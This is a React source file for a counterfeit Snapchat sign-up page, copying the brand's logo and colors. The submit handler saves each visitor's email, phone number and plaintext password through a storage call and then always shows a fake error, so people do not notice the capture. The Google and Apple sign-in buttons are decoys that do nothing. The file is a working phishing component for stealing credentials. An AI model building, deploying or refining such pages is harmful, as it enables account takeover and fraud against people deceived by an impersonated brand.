import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { saveEntry } from "@/lib/storage";
import ghostImg from "@/assets/snapchat-ghost.png";

export default function SignUpPage() {
  const navigate = useNavigate();
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [birthday, setBirthday] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSignUp = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!name.trim()) return setError("Please enter your name.");
    if (!email.trim()) return setError("Please enter your email.");
    if (!password.trim()) return setError("Please enter a password.");
    setLoading(true);
    setTimeout(() => {
      saveEntry({ email, phone, password });
      setLoading(false);
      setError("Something went wrong. Please try again later.");
    }, 1400);
  };

  const handleSSO = (provider: string) => {
    setError(`${provider} sign-in is not available right now.`);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#FFFC00] px-4 py-6">
      <div className="w-full max-w-[340px] bg-white rounded-2xl shadow-xl px-6 py-7">
        {/* Logo */}
        <div className="flex flex-col items-center mb-5">
          <img src={ghostImg} alt="Snapchat" className="w-14 h-14 object-contain" />
          <h1 className="mt-2 text-[22px] font-black tracking-tight text-black">snapchat</h1>
          <p className="text-gray-500 text-[13px] mt-0.5">Create an account</p>
        </div>

        {/* SSO Buttons */}
        <div className="flex flex-col gap-2.5 mb-4">
          <button
            type="button"
            onClick={() => handleSSO("Google")}
            className="flex items-center justify-center gap-2.5 w-full border border-gray-200 rounded-full py-2.5 text-[14px] font-semibold text-gray-700 hover:bg-gray-50 transition"
          >
            <GoogleIcon />
            Continue with Google
          </button>
          <button
            type="button"
            onClick={() => handleSSO("Apple")}
            className="flex items-center justify-center gap-2.5 w-full bg-black rounded-full py-2.5 text-[14px] font-semibold text-white hover:bg-gray-900 transition"
          >
            <AppleIcon />
            Continue with Apple
          </button>
        </div>

        {/* Divider */}
        <div className="flex items-center gap-3 mb-4">
          <div className="flex-1 h-px bg-gray-200" />
          <span className="text-gray-400 text-[12px] font-medium">OR</span>
          <div className="flex-1 h-px bg-gray-200" />
        </div>

        {/* Form */}
        <form onSubmit={handleSignUp} className="flex flex-col gap-3">
          <input
            type="text"
            autoFocus
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="Full Name"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />
          <input
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="Phone Number (optional)"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              autoComplete="new-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full border border-gray-200 rounded-xl px-4 py-2.5 pr-11 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
            />
            <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition">
              {showPassword ? <EyeOffIcon /> : <EyeIcon />}
            </button>
          </div>
          <input
            type="date"
            value={birthday}
            onChange={(e) => setBirthday(e.target.value)}
            placeholder="Birthday"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />

          {error && <p className="text-red-500 text-[13px] text-center">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#FFFC00] hover:bg-yellow-400 disabled:opacity-60 text-black font-bold rounded-full py-2.5 text-[15px] transition flex items-center justify-center gap-2 mt-1"
          >
            {loading ? (
              <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
              </svg>
            ) : "Sign Up"}
          </button>
        </form>

        <p className="text-center text-[11px] text-gray-400 mt-3 leading-relaxed">
          By signing up, you agree to our{" "}
          <a href="#" className="underline">Terms</a> and{" "}
          <a href="#" className="underline">Privacy Policy</a>.
        </p>

        <p className="text-center text-[13px] text-gray-500 mt-3">
          Already have an account?{" "}
          <button onClick={() => navigate("/")} className="font-bold text-black hover:underline">
            Log In
          </button>
        </p>
      </div>
    </div>
  );
}

function GoogleIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  );
}

function AppleIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 814 1000" fill="white">
      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.4-150.3-119.5C27.1 773.4 0 689.4 0 609c0-131 86.2-200.2 170.8-200.2 82.2 0 140.4 54.4 197.3 54.4 54.8 0 123.7-57.5 213.7-57.5zm-62-218.3c37.3-45.9 63.7-110.2 63.7-174.4 0-9.1-.6-18.3-2-27.4-60.6 2.6-132.9 41.3-177.3 97.7-33 38.4-65 104.9-65 172.2 0 10.4 1.9 21.5 2.6 24.7 3.9.6 10.4 1.3 16.9 1.3 54.8 0 122.7-37.5 161.1-94.1z"/>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  );
}
